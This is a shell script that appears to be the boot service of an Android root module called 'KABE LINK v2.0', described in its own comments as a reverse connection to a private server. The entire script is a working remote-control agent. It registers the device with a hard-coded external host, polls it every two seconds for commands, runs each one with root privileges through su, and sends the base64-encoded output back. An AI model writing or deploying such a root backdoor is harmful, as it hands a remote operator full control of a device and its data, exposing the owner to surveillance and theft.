#!/system/bin/sh
# KABE LINK v2.0
# Conexao reversa ao site KABE PRIVATE

MODDIR=${0%/*}
if [ ! -f "$MODDIR/service.sh" ]; then
    for d in /data/adb/modules/kabe-link /data/adb/ksu/modules/kabe-link /data/adb/ksu/modules/kabe-private /data/adb/ap/modules/kabe-link; do
        [ -f "$d/service.sh" ] && MODDIR="$d" && break
    done
fi

DATA_DIR="/data/adb/kabe"
KEY_FILE="$DATA_DIR/key"
CONFIG_FILE="$DATA_DIR/config"
LOG_FILE="$DATA_DIR/link.log"
PID_FILE="$DATA_DIR/link.pid"
DEFAULT_SERVER="https://kabe-private-production.up.railway.app"

# HTTP helper
http_post() {
    local url="$1" data="$2"
    if command -v curl >/dev/null 2>&1; then
        curl -s --connect-timeout 5 --max-time 8 -X POST -H "Content-Type: application/json" -d "$data" "$url" 2>/dev/null
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O - --timeout=8 --post-data="$data" --header="Content-Type: application/json" "$url" 2>/dev/null
    fi
}
http_get() {
    local url="$1"
    if command -v curl >/dev/null 2>&1; then
        curl -s --connect-timeout 5 --max-time 8 "$url" 2>/dev/null
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O - --timeout=8 "$url" 2>/dev/null
    fi
}

# Esperar boot
sleep 8

# Diretorios
mkdir -p "$DATA_DIR" 2>/dev/null
mkdir -p "$DATA_DIR/www" 2>/dev/null

# Key
if [ ! -f "$KEY_FILE" ]; then
    RAW=$(cat /proc/sys/kernel/random/uuid 2>/dev/null)
    if [ -n "$RAW" ]; then RANDOM_PART=$(echo "$RAW" | tr -d '-' | head -c 16 | tr 'a-z' 'A-Z'); fi
    if [ -z "$RANDOM_PART" ]; then RANDOM_PART=$(cat /dev/urandom 2>/dev/null | tr -dc 'A-F0-9' | head -c 16); fi
    if [ -z "$RANDOM_PART" ]; then RANDOM_PART=$(date +%s%N 2>/dev/null | md5sum | head -c 16 | tr 'a-z' 'A-Z'); fi
    if [ -z "$RANDOM_PART" ]; then RANDOM_PART=$(date +%s | md5sum | head -c 16 | tr 'a-z' 'A-Z'); fi
    KEY="KABE-${RANDOM_PART}"
    echo "$KEY" > "$KEY_FILE"
    chmod 600 "$KEY_FILE"
fi

KEY=$(cat "$KEY_FILE" 2>/dev/null | tr -d '\n\r ' | xargs)
[ -z "$KEY" ] && exit 1

# Server
if [ -f "$CONFIG_FILE" ]; then SERVER_URL=$(grep "^server=" "$CONFIG_FILE" 2>/dev/null | cut -d= -f2-); fi
[ -z "$SERVER_URL" ] && SERVER_URL="$DEFAULT_SERVER"

# Device
DEVICE_ID=$(getprop ro.product.model 2>/dev/null)
[ -z "$DEVICE_ID" ] && DEVICE_ID="android"

# Log
log() { echo "$(date '+%H:%M:%S') $1" >> "$LOG_FILE"; }
log "KABE LINK v2.0 | Key: $KEY | Server: $SERVER_URL"

# Matar antigos
if [ -f "$PID_FILE" ]; then
    OLD_PID=$(cat "$PID_FILE" 2>/dev/null)
    [ -n "$OLD_PID" ] && kill -0 "$OLD_PID" 2>/dev/null && kill -9 "$OLD_PID" 2>/dev/null
    sleep 1
fi
echo $$ > "$PID_FILE"

# Loop
log "Loop iniciado"
while true; do
    if [ -f "$DATA_DIR/stop" ]; then
        rm -f "$DATA_DIR/stop"
        log "Parado"
        break
    fi

    # Heartbeat
    http_post "$SERVER_URL/api/agent/register" "{\"key\":\"$KEY\",\"id\":\"$DEVICE_ID\"}" > /dev/null 2>&1 &

    # Poll comandos
    RESP=$(http_get "$SERVER_URL/api/agent/poll?key=$KEY")
    if [ -n "$RESP" ] && [ "$RESP" != "null" ] && [ "$RESP" != "" ]; then
        CMD_ID=$(echo "$RESP" | grep -o '"id":[0-9]*' | head -1 | cut -d: -f2)
        CMD_TEXT=$(echo "$RESP" | sed 's/.*"cmd":"//;s/".*//' | head -1)
        if [ -n "$CMD_TEXT" ] && [ -n "$CMD_ID" ]; then
            log "cmd #$CMD_ID: $CMD_TEXT"
            OUTPUT=$(su -c "$CMD_TEXT" 2>&1)
            EXIT_CODE=$?
            B64=$(echo -n "$OUTPUT" | base64 -w 0 2>/dev/null || echo -n "$OUTPUT" | base64 2>/dev/null || echo "$OUTPUT")
            http_post "$SERVER_URL/api/agent/output" "{\"key\":\"$KEY\",\"id\":$CMD_ID,\"exit\":$EXIT_CODE,\"data\":\"$B64\"}" > /dev/null 2>&1 &
            log "cmd #$CMD_ID ok"
        fi
    fi

    sleep 2
done

rm -f "$PID_FILE"
log "KABE LINK parado"
